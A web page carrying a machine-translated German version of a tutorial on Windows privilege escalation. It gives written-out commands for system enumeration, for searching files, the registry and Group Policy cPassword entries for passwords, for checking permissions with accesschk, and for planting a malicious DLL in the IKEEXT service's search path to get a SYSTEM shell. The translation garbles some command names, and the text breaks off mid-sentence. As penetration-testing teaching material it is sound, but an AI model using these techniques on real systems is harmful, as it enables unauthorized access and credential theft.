<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü•ß ü§õüèø ‚úîÔ∏è Grundlagen der Windows-Berechtigungseskalation ‚ôãÔ∏è ü§≥üèº ‚öõÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Ich habe mich f√ºr mich selbst und f√ºr diejenigen, die es n√ºtzlich finden w√ºrden, entschieden, alles zu sammeln, was ich wei√ü, aber ich erinnere mich n...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Grundlagen der Windows-Berechtigungseskalation</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/418441/"> Ich habe mich f√ºr mich selbst und f√ºr diejenigen, die es n√ºtzlich finden w√ºrden, entschieden, alles zu sammeln, was ich wei√ü, aber ich erinnere mich nicht an das Thema in diesem Artikel.  Tipps teilen.  Die Hauptquelle dieses Artikels ist <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">dies</a> . <br><br>  Ich √ºbersetzte frei und f√ºgte ein wenig von mir hinzu, was ich sammelte und aus anderen Quellen lernte. <br><br>  Im Allgemeinen gibt es hier M√∂glichkeiten, wie wir unser Ziel der Eskalation von Privilegien erreichen k√∂nnen. <br><a name="habracut"></a><br>  Der Ausgangspunkt f√ºr diesen kurzen Artikel ist eine nicht privilegierte Shell (Konto).  Vielleicht haben wir einen Exploit benutzt oder einen Angriff ausgef√ºhrt und diese Shell bekommen. <br><br>  Grunds√§tzlich verstehen wir den Computer zu Beginn nicht: Was er tut, womit er verbunden ist, welche Berechtigungen wir haben oder sogar welches Betriebssystem er ist. <br><br>  Zuerst m√ºssen wir die Informationen erhalten, die wir ben√∂tigen, um zu verstehen, wo wir sind und was wir haben: <br><br><pre><code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">systeminfo</span></span> | findstr /B /C:<span class="hljs-string"><span class="hljs-string">" "</span></span> /C:<span class="hljs-string"><span class="hljs-string">" "</span></span></code> </pre> <br>  Mit diesem Befehl k√∂nnen Sie den Namen und die Version des Betriebssystems bestimmen, wie Sie daraus sehen k√∂nnen.  Sie k√∂nnen es ohne Parameter ausf√ºhren, dann ist die Ausgabe des Befehls vollst√§ndiger, aber das reicht uns. <br><br>  Als n√§chstes ist es wichtig, den Namen des Computers und den Benutzernamen herauszufinden, unter dem wir verbunden sind. <br><br><ul><li>  Hostname ist der Benutzername. </li><li>  echo% username% - username. </li></ul><br>  Lassen Sie uns als N√§chstes sehen, welche Benutzer sich noch auf diesem Host befinden, und detailliertere Informationen zu ihren Benutzern erhalten. <br><br><ul><li>  Netznutzer - andere Benutzer </li><li>  net user user1 - detaillierte Informationen zum Benutzer, wobei user1 der Name Ihres Benutzers ist. </li></ul><br>  Nachdem wir Informationen √ºber das Konto erhalten haben, werden Informationen zur Netzwerkinteraktion dieses Hosts angezeigt. <br><br>  Schauen Sie sich zun√§chst die verf√ºgbaren Schnittstellen und die Routing-Tabelle an. <br><br><ul><li>  ipconfig / all - Informationen zu den verf√ºgbaren Schnittstellen. </li><li>  Routendruck - Routing-Tabelle </li><li>  arp -A - Tabelle der Arp-Eintr√§ge </li></ul><br>  Als n√§chstes sehen wir die aktiven Netzwerkverbindungen und Firewall-Regeln. <br><br><ul><li>  netstat -ano - aktive Netzwerkverbindungen. </li></ul><br>  -a - Beim Starten mit diesem Parameter werden alle aktiven TCP-Verbindungen sowie die vom System abgeh√∂rten TCP- und UDP-Ports angezeigt. <br>  -n - Mit dem Parameter k√∂nnen Sie aktive TCP-Verbindungen mit Adressen und Portnummern anzeigen. <br>  -o - zeigt wie der vorherige Schl√ºssel aktive TCP-Verbindungen an, aber Prozesscodes werden zur Statistik hinzugef√ºgt. Es ist bereits m√∂glich, genau zu bestimmen, welche Anwendung die Verbindung verwendet. <br><br><ul><li>  netsh firewall show state - Firewall-Status </li><li>  netsh firewall show config - Konfiguration der Firewall </li></ul><br>  Abschlie√üend untersuchen wir kurz, was auf einem gef√§hrdeten Host funktioniert: geplante Aufgaben, Ausf√ºhren von Prozessen, Ausf√ºhren von Diensten und installierte Treiber. <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">schtasks</span></span> /query /fo LIST /v</code> </pre> <br>  wo <br>  / query - Zeigt Daten zu allen geplanten Aufgaben an. <br>  / fo LIST - Listenausgabe. <br>  / v - Druckauftragsdetails. <br><br>  Mit dem folgenden Befehl werden laufende Prozesse mit laufenden Diensten verkn√ºpft. <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">tasklist</span></span> /SVC</code> </pre> <br>  wo <br>  / SVC - Mapping-Services f√ºr jeden Prozess. <br><br>  Siehe auch eine Liste der ausgef√ºhrten Windows-Dienste. <br><br><pre> <code class="hljs dos"><span class="hljs-built_in"><span class="hljs-built_in">net</span></span> <span class="hljs-built_in"><span class="hljs-built_in">start</span></span></code> </pre> <br>  Es ist auch n√ºtzlich, Informationen zu den Treibern eines gef√§hrdeten Systems anzuzeigen. <br><br><pre> <code class="hljs">DRIVERQUERY</code> </pre> <br>  Als n√§chstes m√∂chte ich den wahrscheinlich n√ºtzlichsten Windows-Befehl erw√§hnen - wmic.  Mit dem Befehl WMIC (Windows Management Instrumentation Command) k√∂nnen Sie Informationen zu Hardware und System abrufen, Prozesse und deren Komponenten verwalten und Einstellungen mithilfe der Funktionen von Windows Management Instrumentation (Windows Management Instrumentation oder WMI) √§ndern.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gute Beschreibung</a> . <br><br>  Leider erlauben einige Windows-Konfigurationen standardm√§√üig keinen Zugriff auf WMIC, wenn der Benutzer kein Mitglied der Administratorgruppe ist (was eine wirklich gute Idee ist).  Jede XP-Version erlaubte keinen Zugriff auf WMIC von einem nicht privilegierten Konto aus. <br><br>  Im Gegensatz dazu erm√∂glichten Windows 7 Professional und Windows 8 Enterprise Benutzern mit geringen Berechtigungen die standardm√§√üige Verwendung von WMIC. <br><br>  Wie gewohnt - Programmparameter: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">wmic</span></span> /?</code> </pre> <br>  <a href="">Ein gutes Skript zum Sammeln von Informationen √ºber wmic.</a> <br><br>  Bevor Sie fortfahren, sollten Sie die gesammelten Informationen durchgehen.  Es lohnt sich auch, auf die im System installierten Patches zu achten, da alle Informationen zu den L√ºcken im System zus√§tzliche Unterst√ºtzung f√ºr die Erh√∂hung unserer Berechtigungen bieten.  HotFix kann nach Schwachstellen bei der Eskalation von Berechtigungen suchen. <br><br>  Als n√§chstes betrachten wir eine unbeaufsichtigte Installation.  Wenn eine gro√üe Maschinenflotte installiert und konfiguriert werden muss, wechselt das technische Personal in der Regel nicht von Maschine zu Maschine, um die einzelnen Maschinen zu konfigurieren.  Es gibt verschiedene L√∂sungen f√ºr die unbeaufsichtigte Installation.  F√ºr uns ist es nicht so wichtig, was diese Methoden sind und wie sie funktionieren. Entscheidend ist jedoch, dass die f√ºr den Installationsprozess verwendeten Konfigurationsdateien viele vertrauliche Informationen enthalten, z. B. den Produktschl√ºssel des Betriebssystems und das Administratorkennwort.  Was uns am meisten interessiert, ist das Administratorkennwort, mit dem wir unsere Berechtigungen erh√∂hen k√∂nnen. <br><br>  Dies sind in der Regel folgende Verzeichnisse: <br><br><ul><li>  c: \ sysprep.inf </li><li>  c: \ sysprep \ sysprep.xml </li><li>  % WINDIR% \ Panther \ Unattend \ Unattended.xml </li><li>  % WINDIR% \ Panther \ Unattended.xml </li></ul><br>  Es lohnt sich jedoch, das gesamte System zu √ºberpr√ºfen. <br><br>  Diese Dateien enthalten Kennw√∂rter im Klartext oder BASE64-codiert. <br>  Beispiele: <br><br>  Sysprep.inf - Passwort im Klartext. <br><br><img src="https://habrastorage.org/webt/fq/1t/qm/fq1tqm53bjiwjlwsbrevzdcy6qw.png">  "" <br><br>  Sysprep.xml - Base64-codiertes Passwort. <br><br><img src="https://habrastorage.org/webt/rh/2r/gk/rh2rgkl3wtby-9lagcxmfrnrlgu.png">  "" <br><br>  Unattended.xml - Base64-codiertes Passwort. <br><br><img src="https://habrastorage.org/webt/5e/1p/gl/5e1pglvwtogk0kd0xn4cmey_hlo.png"><br><br>  F√ºr Hosts, die mit der Dom√§ne verbunden sind, k√∂nnen Sie auch nach der Datei Group.xml suchen, die das AES256-verschl√ºsselte Kennwort enth√§lt, die jedoch entschl√ºsselt werden kann, weil  Der Schl√ºssel wird auf msdn (https://msdn.microsoft.com/en-us/library/cc422924.aspx) und anderen Quellen ver√∂ffentlicht.  Dies ist jedoch der Fall, wenn die Richtlinie zum Erstellen lokaler Benutzer auf Hosts oder zum Festlegen eines Kennworts f√ºr einen lokalen Administrator verwendet wird. <br><br>  Zum Beispiel habe ich hier: <br><br><img src="https://habrastorage.org/webt/jy/wu/4g/jywu4g6xzymrbkwwniw4m_3uckg.png"><br><br>  Nachdem wir es ge√∂ffnet haben, suchen wir nach dem Parameter "cpassword". <br><br><img src="https://habrastorage.org/webt/i9/ow/hk/i9owhkwprnwlpmltga00uj-awx4.png"><br><br>  Als n√§chstes m√ºssen Sie diese Sequenz entschl√ºsseln.  Wir verwenden zum Beispiel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">CrypTool</a> .  Dekodieren Sie zun√§chst Base64. <br>  Base64-Features sind, dass seine L√§nge ein Vielfaches von 4 sein muss. Daher betrachten wir 4er-Bl√∂cke. Wenn der letzte Block nicht gen√ºgend Zeichen enth√§lt, f√ºgen wir die fehlenden Zeichen mit ‚Äû=‚Äú hinzu. <br>  Ich habe 2 "=". <br><br><img src="https://habrastorage.org/webt/bm/sc/73/bmsc73fsqblniktrnrsyugqowhi.png"><br><br>  Als n√§chstes entschl√ºsseln wir.  Verwenden Sie den obigen Schl√ºssel. <br><br><img src="https://habrastorage.org/webt/-f/n0/nt/-fn0ntf9um-zfyfoqpn7uwafoay.png"><br><br>  Wir entfernen die zus√§tzlichen Punkte, die die Zeichen trennen, und erhalten das Passwort. <br><br>  Neben Group.xml gibt es hier einige andere Richtlinieneinstellungsdateien, die m√∂glicherweise zus√§tzliche cPassword-Attribute enthalten: <br><br><ul><li>  Services \ Services.xml </li><li>  ScheduledTasks \ ScheduledTasks.xml </li><li>  Printers \ Printers.xml </li><li>  Drives \ Drives.xml </li><li>  DataSources \ DataSources.xml </li></ul><br>  Wir alle lieben automatisierte L√∂sungen, damit wir so schnell wie m√∂glich die Ziellinie erreichen k√∂nnen.  Abh√§ngig von der Art der Shell / des Zugriffs gibt es hier zwei Hauptoptionen.  Es gibt ein Metasploit-Modul, das √ºber eine eingerichtete Sitzung (https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp) ausgef√ºhrt werden kann, oder Sie k√∂nnen Get-GPPPassword verwenden, das Teil von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PowerSploit ist</a> . <br><br>  Okay, als n√§chstes.  Wir werden nach dem seltsamen Registrierungsparameter "AlwaysInstallElevated" suchen.  Mit dieser Option k√∂nnen nicht privilegierte Benutzer MSI-Dateien von NT AUTHORITY \ SYSTEM installieren. <br><br>  Um dies verwenden zu k√∂nnen, m√ºssen wir √ºberpr√ºfen, ob beide Registrierungsschl√ºssel installiert sind. In diesem Fall k√∂nnen wir eine SYSTEM-Shell erhalten.  √úberpr√ºfen Sie: <br><br><pre> <code class="hljs tex">reg query HKLM<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Policies</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Installer</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AlwaysInstallElevated</span></span></span></span></code> </pre> <br><pre> <code class="hljs tex">reg query HKCU<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Policies</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Installer</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AlwaysInstallElevated</span></span></span></span></code> </pre> <br>  Metasploit enth√§lt ein spezielles Modul Exploit / windows / local / always_install_elevated, das eine MSI-Datei mit einer speziellen ausf√ºhrbaren Datei erstellt, die vom Installationsprogramm mit Systemberechtigungen extrahiert und ausgef√ºhrt wird.  Nach der Ausf√ºhrung stoppt die msi-Datei die Installation, um die Registrierung von Aktionen im System zu verhindern.  Wenn Sie die Installation mit dem Schalter / quiet starten, wird au√üerdem nicht einmal eine Fehlermeldung angezeigt. <br><br>  Nun, einige n√ºtzliche Suchbefehle im System: <br><br>  Der folgende Befehl durchsucht das Dateisystem nach Dateinamen, die bestimmte Schl√ºsselw√∂rter enthalten.  Sie k√∂nnen eine beliebige Anzahl von Schl√ºsselw√∂rtern angeben. <br><br><pre> <code class="hljs markdown">dir /s <span class="hljs-emphasis"><span class="hljs-emphasis">*pass*</span></span> == <span class="hljs-emphasis"><span class="hljs-emphasis">*cred*</span></span> == <span class="hljs-emphasis"><span class="hljs-emphasis">*vnc*</span></span> == <span class="hljs-emphasis"><span class="hljs-emphasis">*.config*</span></span></code> </pre> <br>  Wenn Sie nach bestimmten Dateitypen nach Schl√ºsselw√∂rtern suchen, kann dieser Befehl eine Menge Ausgabe generieren. <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">findstr</span></span> /si password <span class="hljs-regexp"><span class="hljs-regexp">*.xml</span></span> <span class="hljs-regexp"><span class="hljs-regexp">*.ini</span></span> <span class="hljs-regexp"><span class="hljs-regexp">*.txt</span></span></code> </pre> <br>  In √§hnlicher Weise k√∂nnen die beiden folgenden Befehle verwendet werden, um die Registrierung nach Schl√ºsselw√∂rtern zu durchsuchen, in diesem Fall nach "Kennwort". <br><br><pre> <code class="hljs pgsql">reg query HKLM /f <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> /t REG_SZ /s</code> </pre> <br><pre> <code class="hljs pgsql">reg query HKCU /f <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> /t REG_SZ /s</code> </pre> <br>  Im Moment haben wir bereits genug, um das System zum Laufen zu bringen.  Es gibt jedoch einige gezieltere Angriffe, um das gew√ºnschte Ergebnis zu erzielen: Wir werden uns die Windows-Dienste und -Berechtigungen f√ºr Dateien und Ordner ansehen.  Unser Ziel ist es, schwache Berechtigungen zu verwenden, um die Sitzungsberechtigungen zu verbessern. <br><br>  Wir werden viele Zugriffsrechte pr√ºfen. Accesschk.exe, ein Tool von Microsoft Sysinternals Suite, wird uns dabei helfen.  Microsoft Sysinternals enth√§lt viele gro√üartige Tools.  Das Paket kann von der Microsoft Technet-Website (https://docs.microsoft.com/ru-ru/sysinternals/downloads/sysinternals-suite) heruntergeladen werden. <br><br>  Wir k√∂nnen die erforderliche Berechtigungsstufe f√ºr jeden Dienst mit accesschk √ºberpr√ºfen. <br><br>  Wir k√∂nnen die Berechtigungen sehen, √ºber die jede Benutzerebene verf√ºgt. <br><br><img src="https://habrastorage.org/webt/jo/pf/q2/jopfq2pwodrwtcexiainzaji4yk.png"><br><br>  Accesschk kann automatisch pr√ºfen, ob wir Schreibzugriff auf einen Windows-Dienst mit einer bestimmten Benutzerebene haben.  In der Regel m√∂chten wir als Benutzer mit geringen Berechtigungen die "Benutzer" √ºberpr√ºfen.  Stellen Sie sicher, dass Sie √ºberpr√ºfen, zu welchen Benutzergruppen Sie geh√∂ren. <br><br>  -c Der Name ist ein Windows-Dienst, z. B. ssdpsrv (geben Sie "*" an, um alle Dienste anzuzeigen). <br>  -d Nur Verzeichnisse verarbeiten <br>  -e Zeigt nur explizit angegebene Integrit√§tsstufen an (nur Windows Vista) <br>  -k Der Name ist ein Registrierungsschl√ºssel, z. B. hklm \ software <br>  -n Zeigt nur Objekte an, f√ºr die keine Zugriffsregeln gelten <br>  -p Der Name oder die Prozesskennung (PID) wird als Name angegeben, z. B. cmd.exe (geben Sie "*" als Namen an, um alle Prozesse anzuzeigen). <br>  -q Header weglassen <br>  -r Nur Objekte drucken, die Lesezugriff haben <br>  -s Rekursive Verarbeitung <br>  -v Detaillierte Informationen drucken <br>  -w Listet nur Objekte auf, die Schreibzugriff haben <br><br><img src="https://habrastorage.org/webt/4z/1r/u6/4z1ru6mikuprkxybtdzohmzgl5s.png"><br><br>  Es gibt noch einen weiteren interessanten Befehl: <br><br><pre> <code class="hljs dos">autorunsc.exe -a | <span class="hljs-built_in"><span class="hljs-built_in">findstr</span></span> /n /R "File\ <span class="hljs-keyword"><span class="hljs-keyword">not</span></span>\ found"</code> </pre> <br>  Erm√∂glicht das Suchen eines Registrierungseintrags zu einer Datei, die automatisch gestartet wurde, aber bereits im System fehlt.  Der Datensatz k√∂nnte bestehen bleiben, wenn beispielsweise der Dienst falsch gel√∂scht wurde.  Bei jedem Start versucht das System erfolglos, diese Datei auszuf√ºhren.  Sie k√∂nnen diese Situation auch nutzen, um Ihre Autorit√§t zu erweitern.  Ersetzen Sie einfach unsere durch unsere Datei. <br><br>  Als n√§chstes betrachten wir zwei Schwachstellen: <br><br>  Erstens: Replizieren Sie die Ergebnisse eines Beitrags von Parvez von GreyHatHacker.  "Erh√∂hen von Berechtigungen durch Ausnutzen schwacher Ordnerberechtigungen" (http://www.greyhathacker.net/?p=738). <br><br>  Dieses Beispiel ist ein Sonderfall beim Entf√ºhren von DLLs.  Programme k√∂nnen normalerweise nicht alleine funktionieren, sie haben viele Ressourcen, die sie verbinden m√ºssen (haupts√§chlich DLL, aber auch ihre eigenen Dateien).  Wenn ein Programm oder ein Dienst eine Datei aus einem Verzeichnis herunterl√§dt, auf das wir Schreibzugriff haben, k√∂nnen wir sie missbrauchen, um eine Shell mit Berechtigungen zu starten, unter denen das Programm ausgef√ºhrt wird. <br><br>  In der Regel verwendet eine Windows-Anwendung vordefinierte Suchpfade, um die DLL zu finden, und √ºberpr√ºft diese Pfade in einer bestimmten Reihenfolge.  DLL-Hijacking tritt normalerweise auf, indem b√∂swillige DLLs entlang eines dieser Pfade platziert werden.  Dieses Problem kann behoben werden, indem der Anwendung absolute Pfade zur erforderlichen DLL angezeigt werden. <br><br>  DLL-Suchreihenfolge: <br><br><ol><li>  Das Verzeichnis, aus dem die Anwendung ausgef√ºhrt wird </li><li>  32-Bit-Systemverzeichnis (C: \ Windows \ System32) </li><li>  16-Bit-Systemverzeichnis (C: \ Windows \ System) </li><li>  Windows-Verzeichnis (C: \ Windows) </li><li>  Aktuelles Arbeitsverzeichnis (CWD) </li><li>  Verzeichnisse in der Umgebungsvariablen PATH (System dann Benutzer) </li></ol><br>  Manchmal versuchen Anwendungen, DLL-Dateien herunterzuladen, die auf dem Computer fehlen.  Dies kann verschiedene Gr√ºnde haben, z. B. wenn die DLL-Bibliothek nur f√ºr bestimmte Plug-Ins oder Komponenten ben√∂tigt wird, die nicht installiert sind.  In diesem Fall hat Parvez festgestellt, dass einige Windows-Dienste versuchen, DLL-Bibliotheken zu laden, die in den Standardeinstellungen nicht vorhanden sind. <br><br>  Da die DLL nicht existiert, gehen wir am Ende alle Suchpfade durch.  Als Benutzer mit geringen Berechtigungen haben wir kaum eine Chance, eine sch√§dliche DLL in die Punkte 1 bis 4, 5 aufzunehmen. Wenn wir jedoch Schreibzugriff auf eines der Verzeichnisse haben, sind unsere Gewinnchancen gro√ü. <br><br>  Lassen Sie uns sehen, wie es in der Praxis funktioniert. In unserem Beispiel verwenden wir den IKEEXT-Dienst (IPSec IKE und AuthIP-Schl√ºsselmodule), der versucht, wlbsctrl.dll herunterzuladen. <br><br>  Jedes Verzeichnis in "C: \" bietet authentifizierten Benutzern Schreibzugriff. Dies gibt uns eine Chance. <br><br><pre> <code class="hljs tex">C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Users</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span></span>1<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Desktop</span></span></span></span>&gt; accesschk.exe -dqv "C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Python</span></span></span></span>27"</code> </pre> <br><pre> <code class="hljs pgsql">C:\Python27 Medium Mandatory <span class="hljs-keyword"><span class="hljs-keyword">Level</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">Default</span></span>) [<span class="hljs-keyword"><span class="hljs-keyword">No</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Write</span></span>-Up] RW BUILTIN\Administrators FILE_ALL_ACCESS RW NT AUTHORITY\<span class="hljs-keyword"><span class="hljs-keyword">SYSTEM</span></span> FILE_ALL_ACCESS R BUILTIN\Users FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE SYNCHRONIZE READ_CONTROL RW NT AUTHORITY\Authenticated Users FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE FILE_WRITE_ATTRIBUTES FILE_WRITE_EA <span class="hljs-keyword"><span class="hljs-keyword">DELETE</span></span> SYNCHRONIZE READ_CONTROL</code> </pre><br><pre> <code class="hljs tex">C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Users</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span></span>1<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Desktop</span></span></span></span>&gt; icacls "C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Python</span></span></span></span>27"</code> </pre> <br><pre> <code class="hljs tex">C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Python</span></span></span></span>27 BUILTIN<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Administrators</span></span></span></span>:(ID)F BUILTIN<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Administrators</span></span></span></span>:(OI)(CI)(IO)(ID)F NT AUTHORITY<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SYSTEM</span></span></span></span>:(ID)F NT AUTHORITY<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SYSTEM</span></span></span></span>:(OI)(CI)(IO)(ID)F BUILTIN<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Users</span></span></span></span>:(OI)(CI)(ID)R NT AUTHORITY<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Authenticated</span></span></span></span> Users:(ID)C NT AUTHORITY<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Authenticated</span></span></span></span> Users:(OI)(CI)(IO)(ID)C</code> </pre><br>  F - voller Zugriff. <br>  (OI) - Vererbung durch Objekte. <br>  (CI) - Vererbung durch Container. <br>  (IO) - nur Vererbung. <br>  (NP) - ein Verbot der Verteilung der Erbschaft. <br>  (I) - Berechtigungen vom √ºbergeordneten Container erben. <br><br>  Bevor Sie mit der Aktion fortfahren, m√ºssen Sie den Status des IKEEXT-Dienstes √ºberpr√ºfen.  In diesem Fall k√∂nnen wir sehen, dass es auf "AUTO_START" gesetzt ist! <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">sc</span></span> qc IKEEXT</code> </pre> <br><pre> <code class="hljs tex">[SC] QueryServiceConfig SUCCESS SERVICE_NAME: IKEEXT TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">system</span></span></span></span>32<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svchost</span></span></span></span>.exe -k netsvcs LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : IKE and AuthIP IPsec Keying Modules DEPENDENCIES : BFE SERVICE_START_NAME : LocalSystem</code> </pre> <br>  Jetzt wissen wir, dass wir die notwendigen Bedingungen haben, und wir k√∂nnen eine b√∂sartige DLL erstellen und die Shell abfangen! <br><br>  Wir verwenden zum Beispiel Metasploit -&gt; msfvenom. <br><br><img src="https://habrastorage.org/webt/ac/-m/_z/ac-m_z8lymihvi6r6g3dsxmebr8.png"><br><br>  Nachdem wir die Datei "evil.dll" auf unseren Zielcomputer √ºbertragen haben, m√ºssen wir sie nur in "wlbsctrl.dll" umbenennen und in "C: \ Python27" verschieben.  Sobald dies erledigt ist, m√ºssen wir geduldig auf den Neustart des Computers warten (oder wir k√∂nnen versuchen, den Neustart zu erzwingen), und wir erhalten die System-Shell. <br><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">copy</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">evil</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.dll</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">C</span></span>:\<span class="hljs-selector-tag"><span class="hljs-selector-tag">Python27</span></span>\<span class="hljs-selector-tag"><span class="hljs-selector-tag">wlbsctrl</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.dll</span></span></code> </pre> <br>  Danach muss nur noch auf den Neustart des Systems gewartet werden. <br><br>  In unserem letzten Beispiel werden wir die geplanten Aufgaben betrachten.  Ich werde das Prinzip beschreiben, weil  Alle k√∂nnen unterschiedliche F√§lle haben. <br><br>  Wir finden den Prozess, den Dienst und die Anwendung, die vom Taskplaner von SYSTEM gestartet wurden. <br>  Wir √ºberpr√ºfen die Zugriffsrechte auf den Ordner, in dem sich unser Ziel befindet. <br><br><pre> <code class="hljs powershell">accesschk.exe <span class="hljs-literal"><span class="hljs-literal">-dqv</span></span> <span class="hljs-string"><span class="hljs-string">"__"</span></span></code> </pre> <br>  Es ist klar, dass dies ein ernstes Konfigurationsproblem ist, aber noch schlimmer ist die Tatsache, dass jeder authentifizierte Benutzer 